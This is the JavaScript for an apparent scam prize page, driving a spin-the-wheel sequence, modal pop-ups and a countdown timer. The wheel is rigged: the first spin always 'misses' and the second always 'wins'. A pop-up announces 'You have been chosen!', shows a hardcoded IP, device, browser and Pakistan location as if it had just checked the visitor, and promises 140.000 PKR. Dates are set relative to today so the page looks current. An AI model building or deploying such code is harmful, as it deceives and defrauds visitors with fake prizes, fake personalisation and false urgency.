(function () {
    if (typeof window.CustomEvent === "function") return false;
    function CustomEvent(event, params) {
        params = params || { bubbles: false, cancelable: false, detail: null };
        var evt = document.createEvent('CustomEvent');
        evt.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
        return evt;
    }
    window.CustomEvent = CustomEvent;
})();

$modal = function (options) {
    var
        _elemModal,
        _eventShowModal,
        _eventHideModal,
        _hiding = false,
        _destroyed = false,
        _animationSpeed = 200;

    function _createModal(options) {
        var
            elemModal = document.createElement('div'),
            modalTemplate = '<div class="modal__backdrop" data-dismiss="modal"><div class="modal__content"><div class="modal__body" data-modal="content">{{content}}</div>{{footer}}<span class="modal__btn-close" data-dismiss="modal" title="Close">ОК</span></div></div>',
            modalFooterTemplate = '<div class="modal__footer">{{buttons}}</div>',
            modalButtonTemplate = '<button type="button" class="{{button_class}}" data-handler={{button_handler}}>{{button_text}}</button>',
            modalHTML,
            modalFooterHTML = '';

        elemModal.classList.add('modal');
        modalHTML = modalTemplate.replace('{{title}}', options.title || '');
        modalHTML = modalHTML.replace('{{content}}', options.content || '');
        if (options.footerButtons) {
            for (var i = 0, length = options.footerButtons.length; i < length; i++) {
                var modalFooterButton = modalButtonTemplate.replace('{{button_class}}', options.footerButtons[i].class);
                modalFooterButton = modalFooterButton.replace('{{button_handler}}', options.footerButtons[i].handler);
                modalFooterButton = modalFooterButton.replace('{{button_text}}', options.footerButtons[i].text);
                modalFooterHTML += modalFooterButton;
            }
            modalFooterHTML = modalFooterTemplate.replace('{{buttons}}', modalFooterHTML);
        }
        modalHTML = modalHTML.replace('{{footer}}', modalFooterHTML);
        elemModal.innerHTML = modalHTML;
        document.body.appendChild(elemModal);
        return elemModal;
    }

    function _showModal() {
        if (!_destroyed && !_hiding) {
            _elemModal.classList.add('modal__show');
            document.dispatchEvent(_eventShowModal);
        }
    }

    function _hideModal() {
        _hiding = true;
        _elemModal.classList.remove('modal__show');
        _elemModal.classList.add('modal__hiding');
        setTimeout(function () {
            _elemModal.classList.remove('modal__hiding');
            _hiding = false;
        }, _animationSpeed);
        document.dispatchEvent(_eventHideModal);
    }

    function _handlerCloseModal(e) {
        if (e.target.dataset.dismiss === 'modal') {
            _hideModal();
        }
    }

    _elemModal = _createModal(options || {});


    _elemModal.addEventListener('click', _handlerCloseModal);
    _eventShowModal = new CustomEvent('show.modal', { detail: _elemModal });
    _eventHideModal = new CustomEvent('hide.modal', { detail: _elemModal });

    return {
        show: _showModal,
        hide: _hideModal,
        destroy: function () {
            _elemModal.parentElement.removeChild(_elemModal),
                _elemModal.removeEventListener('click', _handlerCloseModal),
                _destroyed = true;
        },
        setContent: function (html) {
            _elemModal.querySelector('[data-modal="content"]').innerHTML = html;
        },
        setTitle: function (text) {
            _elemModal.querySelector('[data-modal="title"]').innerHTML = text;
        }
    }
};
// --------------------------------------------------------------------------------------

function getURLParameter(name) {
    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
        results = regex.exec(location.search);
    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

function dateOffset(f, c) {
    var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
    1 == b && (f = 0);

    var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
        g = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
    return null != !c && 0 != !c && void 0 != !c
        ? h.getDate() + " " + g[h.getMonth()]
        : "day_name_only" == c && b
        ? d[h.getDay()]
        : "top_date" == c && b
        ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear()
        : void 0;
}
document.getElementById("today").innerHTML = dateOffset(0, 'day_name_only');
document.querySelectorAll(".item_date").forEach(function(element) {
    element.innerHTML = dateOffset(2);
})
document.querySelector(".item_date-4").innerHTML = dateOffset(4);
document.querySelector(".item_date-3").innerHTML = dateOffset(3);
var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

var myDate = new Date();
var fullDate = myDate.getDate() + " " + months[myDate.getMonth()] + " " + myDate.getFullYear() + ", " + days[myDate.getDay()];
document.getElementById("topDate").innerHTML = fullDate;
function speak(c) {
    var b = new SpeechSynthesisUtterance();
    var a = speechSynthesis.getVoices();
    b.voice = a[2];
    b.voiceURI = "native";
    b.volume = 1;
    b.rate = 1;
    b.pitch = 1;
    b.text = c;
    b.lang = "en-EN";
    speechSynthesis.speak(b);
}
speak("Congratilations!");

var page = "page",
brand = "device_brand";

var conMid,
mydate = new Date(),
year = mydate.getFullYear(),
month = mydate.getMonth(),
day = mydate.getDate(),
weekday = mydate.getDay(),
count = 1,
headline = document.getElementById("headline"),
topDate = document.getElementById("topDate"),
today = document.getElementById("today"),
con = document.getElementById("container"),
whCon = document.getElementById("wheelCon"),
dWheel = document.getElementById("wheel"),
button = document.getElementById("pressButton"),
device = document.getElementById("devMockup"),
first = document.getElementById("firstpage"),
second = document.getElementById("secondpage");

window.setButtonHeight = function() {
(conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2), (button.style.top = conMid - button.offsetHeight / 2 - (0.2 * button.offsetHeight) / 2 + "px");
}

window.spin = function() {
var modal = $modal({
    content: '<p style="text-align:center;">You have 1 more chance!</p><br><p style="text-align:center;">Please try again!</p>',
});
switch (count) {
    case 1:
        (button.disabled = !0),
            (dWheel.className = "spinAround"),
            setTimeout(function () {
                (button.disabled = !1),
                    modal.show(),
                    $(".modal__btn-close").click(function () {
                        autospin2();
                    });
            }, 6800);
        break;
    case 2:
        (dWheel.className = "spinAround2"),
            setTimeout(function () {
                dWheel.className = dWheel.className + " transparent";
            }, 6800),
            setTimeout(function () {
                (device.style.display = "block"), (device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px"), (device.style.top = conMid - device.offsetHeight / 2 + "px");
            }, 7000),
            setTimeout(function () {
                (first.innerHTML = "<img src='/img/loading.gif'>"),
                    (first.style.padding = "195px 0px"),
                    setTimeout(function () {
                        first.parentNode.removeChild(first), (second.style.display = "block"), con.insertBefore(second, con.firstChild), setInterval(countdown, 1000);
                    }, 1500);
            }, 9000);
        confetti.clear();
        document.getElementById("my-canvas").remove();
}
count++;
}

function autospin2() {
spin();
}

window.autospin1 = function() {
var modal = $modal({
    content:
        '<p style="text-align:center;">Congratulations! You have been chosen!</p><br><p id="ip_text" style="text-align:center; font-size: 13px;"><b>IP: 95.143.118.90</b> <img id="ip_check" src="/img/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="device_text" style="text-align:center; font-size: 13px;"><b>Device: Desktop Desktop</b> <img id="device_check" src="/img/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="browser_text" style="text-align:center; font-size: 13px;"><b>Browser: Chrome 101.0.4951.67</b> <img id="browser_check" src="/img/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="loc_text" style="text-align:center; font-size: 13px;"><b>Location:Pakistan</b> <img id="loc_check" src="/img/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="os_text" style="text-align:center; font-size: 13px;"><b>OS: Windows 10.0</b> <img id="os_check"src="/img/check_icon.png" width="10" height="10"" alt="check"></p><br><p style="text-align:center;">You are one of 7 people selected to participate in our loyalty program! You can get 1 gift out of 4!</p><br><p style="text-align:center;">✅ Win <strong>140.000 PKR</strong></p><br> <p style="text-align:center;">Click "OK" to get started!</p>',
});
modal.show();
$("#ip_text").show("slow");
setTimeout(function () {
    $("ip_text").hide("slow");
}, 500);

$("#device_text").show("slow");
setTimeout(function () {
    $("device_text").hide("slow");
}, 1000);

$("#browser_text").show("slow");
setTimeout(function () {
    $("browser_text").hide("slow");
}, 3000);

$("#loc_text").show("slow");
setTimeout(function () {
    $("loc_text").hide("slow");
}, 3500);

$("#os_text").show("slow");
setTimeout(function () {
    $("os_text").hide("slow");
}, 4500);

setTimeout(function () {
    $("#ip_check").fadeIn(100);
}, 1500);
setTimeout(function () {
    $("#device_check").fadeIn(100);
}, 2000);
setTimeout(function () {
    $("#browser_check").fadeIn(100);
}, 4000);
setTimeout(function () {
    $("#loc_check").fadeIn(100);
}, 4500);
setTimeout(function () {
    $("#os_check").fadeIn(100);
}, 5100);

$(".modal__btn-close").click(function () {
    document.getElementById("pressButton").click();
});
}

window.countdown = function() {
var d = parseInt(document.getElementById("mins").innerHTML),
    c = parseInt(document.getElementById("hsecs").innerHTML),
    b = 0,
    a = 0;
0 !== d && 0 === c ? ((b = d - 1), (a = 59)) : 0 !== d || 0 !== c ? ((b = d), (a = c - 1)) : 0 === d && 0 === c && ((b = d), (a = c)),
    a < 10 && (a = "0" + a),
    (document.getElementById("mins").textContent = b),
    (document.getElementById("hsecs").textContent = a);
}


// --------------------------------------------------------------------------------------

window.ConfettiGenerator = function (e) {
    var t = {
        target: "confetti-holder",
        max: 80,
        size: 1,
        animate: !0,
        props: ["circle", "square", "triangle", "line"],
        colors: [
            [165, 104, 246],
            [230, 61, 135],
            [0, 199, 228],
            [253, 214, 126],
        ],
        clock: 25,
        interval: null,
        width: window.innerWidth,
        height: window.innerHeight,
    };
    e &&
        (e.target && (t.target = e.target),
        e.max && (t.max = e.max),
        e.size && (t.size = e.size),
        void 0 !== e.animate && null !== e.animate && (t.animate = e.animate),
        e.props && (t.props = e.props),
        e.colors && (t.colors = e.colors),
        e.clock && (t.clock = e.clock),
        e.width && (t.width = e.width),
        e.height && (t.height = e.height));
    var i = document.getElementById(t.target),
        a = i.getContext("2d"),
        r = [];
    function o(e, t) {
        e || (e = 1);
        var i = Math.random() * e;
        return t ? Math.floor(i) : i;
    }
    function n(e) {
        var i = e.radius <= 3 ? 0.4 : 0.8;
        switch (((a.fillStyle = a.strokeStyle = "rgba(" + e.color + ", " + i + ")"), a.beginPath(), e.prop)) {
            case "circle":
                a.moveTo(e.x, e.y), a.arc(e.x, e.y, e.radius * t.size, 0, 2 * Math.PI, !0), a.fill();
                break;
            case "triangle":
                a.moveTo(e.x, e.y), a.lineTo(e.x + e.angles[0] * t.size, e.y + e.angles[1] * t.size), a.lineTo(e.x + e.angles[2] * t.size, e.y + e.angles[3] * t.size), a.closePath(), a.fill();
                break;
            case "line":
                a.moveTo(e.x, e.y), a.lineTo(e.x + e.line * t.size, e.y + 5 * e.radius), (a.lineWidth = 2 * t.size), a.stroke();
                break;
            case "square":
                a.save(), a.translate(e.x + 15, e.y + 5), a.rotate(e.rotation), a.fillRect(-15 * t.size, -5 * t.size, 15 * t.size, 5 * t.size), a.restore();
        }
    }
    return {
        render: function () {
            (i.width = t.width), (i.height = t.height), (r = []);
            for (var e = 0; e < t.max; e++)
                r.push({
                    prop: t.props[o(t.props.length, !0)],
                    x: o(t.width),
                    y: o(t.height),
                    radius: o(4) + 1,
                    line: Math.floor(o(65) - 30),
                    angles: [o(10, !0) + 2, o(10, !0) + 2, o(10, !0) + 2, o(10, !0) + 2],
                    color: t.colors[o(t.colors.length, !0)],
                    rotation: (o(360, !0) * Math.PI) / 180,
                    speed: o(t.clock / 7) + t.clock / 30,
                });
            return (function e() {
                for (var i in (a.clearRect(0, 0, t.width, t.height), r)) n(r[i]);
                !(function () {
                    for (var e = 0; e < t.max; e++) {
                        var i = r[e];
                        t.animate && (i.y += i.speed), i.y > t.height && ((r[e] = i), (r[e].x = o(t.width, !0)), (r[e].y = -10));
                    }
                })(),
                    t.animate && requestAnimationFrame(e);
            })();
        },
        clear: function () {
            (t.animate = !1),
                clearInterval(t.interval),
                requestAnimationFrame(function () {
                    a.clearRect(0, 0, i.width, i.height);
                    var e = i.width;
                    (i.width = 1), (i.width = e);
                });
        },
    };
};

